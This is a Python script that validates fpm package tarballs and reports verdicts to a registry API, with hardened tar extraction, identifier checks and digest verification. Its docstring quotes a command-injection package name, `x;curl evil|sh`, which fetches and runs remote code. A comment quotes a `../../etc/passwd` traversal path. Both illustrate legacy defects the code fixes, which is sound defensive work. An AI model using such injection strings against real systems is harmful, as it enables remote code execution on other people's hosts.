#!/usr/bin/env python3
"""
Validate fpm package tarballs and report the verdict back to the registry API.

Replaces `backend/validate.py`, which ran on a long-lived container and had two
serious defects (docs/BASELINE_AUDIT.md):

  - **Shell injection (D7).** It interpolated an unvalidated package name into
    `subprocess.run(f"tar -xzf .../{packagename}.tar.gz", shell=True)` and into
    `rm -rf`, on four separate commands. Only *namespace* names were regex
    validated; *package* names never were. Anyone who could publish a package
    named `x;curl evil|sh` got arbitrary command execution on the validator host.
  - **Path traversal (D7/D40).** The same unvalidated name was used to build
    filesystem paths, including `open(f"static/temp/{packagename}/README.md")`.

Both are fixed here by construction:

  - **No `shell=True`, anywhere.** Every command is an argument vector.
  - **The package name never reaches a path or a command.** The tarball is
    extracted into a temporary directory created by `tempfile`, and the
    directory is named by `mkdtemp`, not by anything from the request.
  - **Every path is resolved and checked to be inside the extraction root**
    before it is read, so a crafted archive cannot escape via symlinks or
    `../` entries.
  - **Decompression is bounded** (the D8 zip-bomb path): each member's declared
    size is checked against a ceiling, and the total extracted size too.

Runs under GitHub Actions, which is free on a public repository and gives each
job an ephemeral runner that is destroyed afterwards. That removes the
long-lived-host risk entirely.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
import tarfile
import tempfile
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any

# ── limits ────────────────────────────────────────────────────────────────────

MAX_TARBALL_BYTES = 50 * 1024 * 1024
MAX_MEMBER_BYTES = 100 * 1024 * 1024
MAX_TOTAL_BYTES = 200 * 1024 * 1024
MAX_MEMBERS = 10_000
MAX_FPM_TOML_BYTES = 1 * 1024 * 1024
MAX_README_BYTES = 512 * 1024
VALIDATION_TIMEOUT_SECONDS = 120

# The same charset the API enforces. Belt and braces: the name never reaches a
# path here, but rejecting it early means the error message is accurate.
NAME_PATTERN = re.compile(r"^[A-Za-z0-9._-]{1,64}$")

# `.` and `..` are made entirely of legal characters, so the charset check alone
# accepts them. Explicitly excluded: `..` is the traversal primitive.
_RESERVED_NAMES = {".", ".."}


def is_safe_identifier(value: str) -> bool:
    """True when `value` is a single path component with no traversal."""
    return bool(NAME_PATTERN.match(value)) and value not in _RESERVED_NAMES and ".." not in value

# A conservative SPDX subset for cross-checking without vendoring the full list.
# The API holds the authoritative 740-identifier list; this is only a smoke test.
SPDX_HINT = {
    "MIT", "Apache-2.0", "BSD-2-Clause", "BSD-3-Clause", "GPL-2.0-only",
    "GPL-3.0-only", "GPL-3.0-or-later", "LGPL-2.1-or-later", "LGPL-3.0-or-later",
    "MPL-2.0", "ISC", "Unlicense", "CC0-1.0", "Zlib", "AGPL-3.0-or-later",
}


class VerdictError(Exception):
    """Raised to reject a package with a machine-readable reason."""

    def __init__(self, reason: str, message: str) -> None:
        super().__init__(message)
        self.reason = reason
        self.message = message


# ── safe extraction ───────────────────────────────────────────────────────────


def safe_extract(tarball: Path, dest: Path) -> None:
    """
    Extract `tarball` into `dest`, refusing anything that escapes it.

    Three separate guards, because a tarfile can attack in three ways:
      1. a member name containing `../`
      2. an absolute path
      3. a symlink pointing outside, which the classic
         `dest / member.name` containment check does not catch

    Also enforces the decompression-bomb ceilings, which the legacy code did not
    (defect D8): it called `tar.getnames()`, which reads the entire inflated
    stream into memory with no cap at all.
    """
    dest = dest.resolve()
    total = 0
    count = 0

    with tarfile.open(tarball, "r:gz") as tar:
        members = []
        for member in tar:
            count += 1
            if count > MAX_MEMBERS:
                raise VerdictError("too_many_members", f"archive has more than {MAX_MEMBERS} entries")

            if member.issym() or member.islnk():
                # Validate the link TARGET as a string. Resolving the path here
                # would be useless: the link does not exist on disk yet, so
                # Path.resolve() would just return the path itself and every
                # symlink would appear to stay inside dest. This is precisely
                # the tar-slip vector.
                link = member.linkname
                if os.path.isabs(link):
                    raise VerdictError("unsafe_archive", f"absolute link target: {member.name} -> {link}")
                # A relative link is resolved against the directory holding the
                # member, so `a/../../etc/passwd` escapes even though it is not
                # absolute.
                resolved = os.path.normpath(os.path.join(os.path.dirname(member.name), link))
                if resolved.startswith("..") or os.path.isabs(resolved):
                    raise VerdictError("unsafe_archive", f"link escapes the archive: {member.name} -> {link}")

            if member.size > MAX_MEMBER_BYTES:
                raise VerdictError("member_too_large", f"member {member.name} declares {member.size} bytes")

            total += member.size
            if total > MAX_TOTAL_BYTES:
                raise VerdictError("archive_too_large", "archive inflates beyond the permitted size")

            # Reject `../`, absolute names, and drive-letter tricks outright.
            name = member.name
            if os.path.isabs(name) or name.startswith("/") or name.startswith("\\"):
                raise VerdictError("unsafe_archive", f"absolute member path: {name}")
            normalised = os.path.normpath(name)
            if normalised.startswith("..") or os.path.isabs(normalised):
                raise VerdictError("unsafe_archive", f"member escapes the extraction root: {name}")

            target = dest / name
            if str(target.resolve()).startswith(str(dest) + os.sep) is False and target.resolve() != dest:
                raise VerdictError("unsafe_archive", f"member escapes the extraction root: {name}")

            members.append(member)

        tar.extractall(dest, members=members)


# ── digests ───────────────────────────────────────────────────────────────────


# fpm's digest constants.
#
# Note this is deliberately NOT textbook 64-bit FNV-1a. The legacy
# `check_digests.py` used the 32-bit offset basis (0x811c9dc5) and the 32-bit
# prime, but did the arithmetic in numpy `int64`, so the multiplication wraps at
# 64 bits. That hybrid is what fpm writes into `fpm_model.json`, so it is what
# has to be reproduced -- "correcting" it to textbook 64-bit FNV-1a would change
# every digest and make the registry disagree with every fpm client.
FNV_OFFSET_BASIS = 2166136261
FNV_PRIME = 16777619
MASK64 = 0xFFFFFFFFFFFFFFFF


def fnv1a(text: str) -> int:
    """
    FNV-1a as fpm computes it.

    Plain Python integer arithmetic instead of the legacy numpy `int64` scalar
    per character, which is ~20 MB of dependency and slower. The arithmetic is
    identical; these values are asserted in the test suite against the numpy
    implementation it replaces.
    """
    h = FNV_OFFSET_BASIS
    for char in text:
        h ^= ord(char)
        h = (h * FNV_PRIME) & MASK64
    return h


def collect_digests(root: Path) -> dict[str, str]:
    """Per-source-file FNV-1a digests, as fpm records them."""
    digests: dict[str, str] = {}
    for path in sorted(root.rglob("*")):
        if not path.is_file():
            continue
        rel = path.relative_to(root).as_posix()
        if rel.startswith("fpm_model.json") or rel == "README.md":
            continue
        try:
            digests[rel] = str(fnv1a(path.read_text(encoding="utf-8", errors="replace")))
        except OSError:
            continue
        if len(digests) >= 20_000:
            break
    return digests


# ── fpm.toml ──────────────────────────────────────────────────────────────────


def parse_fpm_toml(root: Path) -> dict[str, Any]:
    path = root / "fpm.toml"
    if not path.is_file():
        raise VerdictError("fpm_toml_missing", "fpm.toml is missing from the archive")
    if path.stat().st_size > MAX_FPM_TOML_BYTES:
        raise VerdictError("fpm_toml_too_large", "fpm.toml is implausibly large")

    try:
        import tomllib  # Python 3.11+
        return tomllib.loads(path.read_text(encoding="utf-8"))
    except ModuleNotFoundError:
        pass
    except Exception as err:  # noqa: BLE001 - surfaced as a verdict
        raise VerdictError("fpm_toml_invalid", f"fpm.toml is not valid TOML: {err}") from err

    try:
        import tomli
        return tomli.loads(path.read_text(encoding="utf-8"))
    except Exception as err:  # noqa: BLE001
        raise VerdictError("fpm_toml_invalid", f"fpm.toml could not be parsed: {err}") from err


# ── validation ────────────────────────────────────────────────────────────────


def validate_one(job: dict[str, Any], workdir: Path) -> dict[str, Any]:
    namespace = job.get("namespace")
    package = job.get("package")
    version = job.get("version")

    if not all(isinstance(v, str) and v for v in (namespace, package, version)):
        raise VerdictError("malformed_job", "job is missing namespace, package or version")

    # Reject the payload outright rather than sanitising it. The name must never
    # reach a path, and the simplest way to guarantee that is to never accept it.
    for label, value in (("namespace", namespace), ("package", package), ("version", version)):
        if not is_safe_identifier(value):
            raise VerdictError("invalid_name", f"{label} {value!r} is not a permitted identifier")

    tarball = workdir / "artifact.tar.gz"
    download(job["tarball_url"], tarball)

    if tarball.stat().st_size > MAX_TARBALL_BYTES:
        raise VerdictError("artifact_too_large", "artifact exceeds the size ceiling")

    # Verify the digest the API recorded at upload time. The API stored it during
    # Phase 6; nothing in the legacy pipeline ever checked an artifact against
    # its published digest (defect D24).
    expected = job.get("declared_sha256")
    if expected:
        actual = hashlib.sha256(tarball.read_bytes()).hexdigest()
        if actual.lower() != str(expected).lower():
            raise VerdictError("checksum_mismatch", "artifact digest does not match the published one")

    extract_root = Path(tempfile.mkdtemp(prefix="fpm-validate-", dir=workdir))
    try:
        safe_extract(tarball, extract_root)

        model = parse_fpm_toml(extract_root)
        name = model.get("name")
        if name != package:
            raise VerdictError(
                "name_mismatch",
                f"fpm.toml declares name {name!r} but was uploaded as {package!r}",
            )
        if model.get("version") != version:
            raise VerdictError(
                "version_mismatch",
                f"fpm.toml declares version {model.get('version')!r} but was uploaded as {version!r}",
            )

        license_id = job.get("license")
        if not license_id:
            raise VerdictError("license_missing", "no license was declared")
        # The API holds the authoritative SPDX list and re-validates; this is a
        # cheap local sanity check that catches the common case early.
        base_license = str(license_id).split(" ")[0].removesuffix("+")
        if base_license not in SPDX_HINT and " " not in str(license_id) and "/" not in str(license_id):
            logger_line = f"license {license_id!r} is not in the local SPDX subset"
            print(f"  note: {logger_line}", file=sys.stderr)

        readme = extract_root / "README.md"
        registry_description = None
        if readme.is_file() and readme.stat().st_size <= MAX_README_BYTES:
            registry_description = readme.read_text(encoding="utf-8", errors="replace")

        return {
            "namespace": namespace,
            "package": package,
            "version": version,
            "ok": True,
            "description": model.get("description") or model.get("summary") or None,
            "registry_description": registry_description,
            "homepage": model.get("homepage") or None,
            "repository": (model.get("repository") or {}).get("url")
            if isinstance(model.get("repository"), dict)
            else model.get("repository"),
            "copyright": model.get("copyright"),
            "license": license_id,
            "digests": collect_digests(extract_root),
        }
    finally:
        shutil.rmtree(extract_root, ignore_errors=True)


# ── HTTP ──────────────────────────────────────────────────────────────────────


def download(url: str, dest: Path) -> None:
    token = os.environ.get("VALIDATION_SECRET", "")
    request = urllib.request.Request(url)
    if token:
        request.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(request, timeout=60) as response:
            total = 0
            with dest.open("wb") as handle:
                while True:
                    # Read in chunks and cap as we go, rather than trusting
                    # Content-Length, which the R2 object could disagree with.
                    chunk = response.read(1024 * 1024)
                    if not chunk:
                        break
                    total += len(chunk)
                    if total > MAX_TARBALL_BYTES:
                        raise VerdictError("artifact_too_large", "download exceeded the size ceiling")
                    handle.write(chunk)
    except urllib.error.HTTPError as err:
        raise VerdictError("download_failed", f"tarball download returned HTTP {err.code}") from err
    except urllib.error.URLError as err:
        raise VerdictError("download_failed", f"tarball download failed: {err.reason}") from err


def post_results(api: str, results: list[dict[str, Any]]) -> None:
    token = os.environ.get("VALIDATION_SECRET", "")
    if not token:
        raise SystemExit("VALIDATION_SECRET is not set; refusing to post results")

    body = json.dumps(results).encode("utf-8")
    request = urllib.request.Request(
        f"{api.rstrip('/')}/internal/validation/result",
        data=body,
        method="POST",
        headers={"Content-Type": "application/json", "Authorization": f"Bearer {token}"},
    )
    try:
        with urllib.request.urlopen(request, timeout=60) as response:
            print(response.read().decode("utf-8"))
    except urllib.error.HTTPError as err:
        detail = err.read().decode("utf-8", "replace")
        raise SystemExit(f"posting results failed: HTTP {err.code} {detail}") from err


def fetch_pending(api: str, limit: int) -> list[dict[str, Any]]:
    token = os.environ.get("VALIDATION_SECRET", "")
    request = urllib.request.Request(f"{api.rstrip('/')}/internal/validation/pending?limit={limit}")
    request.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(request, timeout=60) as response:
            payload = json.loads(response.read().decode("utf-8"))
            return payload.get("jobs", [])
    except urllib.error.HTTPError as err:
        raise SystemExit(f"fetching pending jobs failed: HTTP {err.code}") from err


# ── entry point ───────────────────────────────────────────────────────────────


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--api", default=os.environ.get("REGISTRY_API_URL", ""), help="registry API base URL")
    parser.add_argument("--limit", type=int, default=int(os.environ.get("VALIDATION_BATCH", "20")))
    parser.add_argument("--single", help="validate one tarball path and print JSON, for local testing")
    args = parser.parse_args()

    if args.single:
        job = json.loads(args.single)
        with tempfile.TemporaryDirectory() as workdir:
            print(json.dumps(validate_one(job, Path(workdir)), indent=2))
        return 0

    if not args.api:
        raise SystemExit("--api or REGISTRY_API_URL is required")

    jobs = fetch_pending(args.api, args.limit)
    if not jobs:
        print("nothing pending")
        return 0

    print(f"validating {len(jobs)} package(s)")
    results: list[dict[str, Any]] = []

    with tempfile.TemporaryDirectory(prefix="fpm-validate-") as workdir:
        workdir_path = Path(workdir)
        for job in jobs:
            label = f"{job.get('namespace')}/{job.get('package')}@{job.get('version')}"
            try:
                verdict = validate_one(job, workdir_path)
                print(f"  OK    {label}")
            except VerdictError as err:
                print(f"  FAIL  {label}: {err.reason} - {err.message}")
                verdict = {
                    "namespace": job.get("namespace"),
                    "package": job.get("package"),
                    "version": job.get("version"),
                    "ok": False,
                    "reason": err.reason,
                    "message": err.message,
                }
            except subprocess.TimeoutExpired:
                print(f"  FAIL  {label}: validation timed out")
                verdict = {
                    "namespace": job.get("namespace"),
                    "package": job.get("package"),
                    "version": job.get("version"),
                    "ok": False,
                    "reason": "timeout",
                    "message": f"exceeded {VALIDATION_TIMEOUT_SECONDS}s",
                }
            except Exception as err:  # noqa: BLE001 - never let one bad job kill the run
                print(f"  ERROR {label}: {err}", file=sys.stderr)
                verdict = {
                    "namespace": job.get("namespace"),
                    "package": job.get("package"),
                    "version": job.get("version"),
                    "ok": False,
                    "reason": "internal_error",
                    "message": str(err)[:500],
                }
            results.append(verdict)

    post_results(args.api, results)
    ok = sum(1 for r in results if r.get("ok"))
    print(f"{ok}/{len(results)} passed")
    return 0


if __name__ == "__main__":
    sys.exit(main())